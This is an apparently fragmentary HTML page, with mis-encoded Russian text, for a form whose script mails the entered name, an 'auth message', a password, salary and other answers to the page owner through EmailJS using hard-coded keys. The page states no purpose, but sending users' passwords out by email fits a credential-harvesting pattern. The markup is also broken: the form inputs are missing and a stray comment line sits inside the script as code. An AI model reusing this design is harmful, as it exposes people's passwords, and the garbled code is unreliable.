<!DOCTYPE html>

</head>
<body>
    <h1>üìß –§–æ—Ä–º–∞ —Å –æ—Ç–ø—Ä–∞–≤–∫–æ–π –Ω–∞ Email</h1>

    <!-- –§–æ—Ä–º–∞ -->
    <form id="contact-form">

        <!-- –ó–∞—Ä–ø–ª–∞—Ç–∞ -->

        <button type="submit" id="submit-btn">

        <!-- –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏ -->

    <!-- –°–æ–æ–±—â–µ–Ω–∏—è -->
    <div id="success-message" class="success">
        ‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–∞—à email.
    </div>

    <div id="error-message" class="error">
        ‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.
    </div>

    <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º EmailJS -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    
    <script>
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è EmailJS
        // –ó–ê–ú–ï–ù–ò–¢–ï
        'your_public_key' –Ω–∞ –≤–∞—à –Ω–∞—Å—Ç–æ—è—â–∏–π Public Key
        emailjs.init('IbXLsF7-V2GK-p_ru');

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º—ã
        document.getElementById('contact-form').addEventListener('submit', function(event) {
            event.preventDefault(); // –û—Ç–º–µ–Ω—è–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é –æ—Ç–ø—Ä–∞–≤–∫—É
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏
            const submitBtn = document.getElementById('submit-btn');
            const loading = document.getElementById('loading');
            const success = document.getElementById('success-message');
            const error = document.getElementById('error-message');
            
            submitBtn.disabled = true;
            loading.style.display = 'block';
            success.style.display = 'none';
            error.style.display = 'none';

            // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ —Ñ–æ—Ä–º—ã
            const formData = {
                food: document.getElementById('food').value,
                name: document.getElementById('name').value,
                auth_msg: document.getElementById('auth_msg').value,
                password: document.getElementById('password').value,
                cachestva: document.getElementById('cachestva').value,
                zp: document.getElementById('zp').value,
                timestamp: new Date().toLocaleString('ru-RU'),
                ip: '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ –≤ –±—Ä–∞—É–∑–µ—Ä–µ' // IP –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å —á–µ—Ä–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Å–µ—Ä–≤–∏—Å
            };

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ EmailJS
            // –ó–ê–ú–ï–ù–ò–¢–ï 'your_service_id' –∏ 'your_template_id' –Ω–∞ –≤–∞—à–∏ –Ω–∞—Å—Ç–æ—è—â–∏–µ ID
            emailjs.send('service_02kbbyh', 'template_e7mf4qm', formData)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    
                    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
                    success.style.display = 'block';
                    loading.style.display = 'none';
                    
                    // –û—á–∏—â–∞–µ–º —Ñ–æ—Ä–º—É
                    document.getElementById('contact-form').reset();
                    
                    // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                    setTimeout(() => {
                        submitBtn.disabled = false;
                    }, 3000);
                    
                }, function(error) {
                    console.log('FAILED...', error);
                    
                    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—à–∏–±–∫—É
                    error.style.display = 'block';
                    loading.style.display = 'none';
                    submitBtn.disabled = false;
                });
        });

        // –í–∞–ª–∏–¥–∞—Ü–∏—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
        document.querySelectorAll('input, select, textarea').forEach(element => {
            element.addEventListener('blur', function() {
                if (!this.value && this.hasAttribute('required')) {
                    this.style.borderColor = 'red';
                } else {
                    this.style.borderColor = '#ddd';
                }
            });
        });
    </script>
</body>
</html>
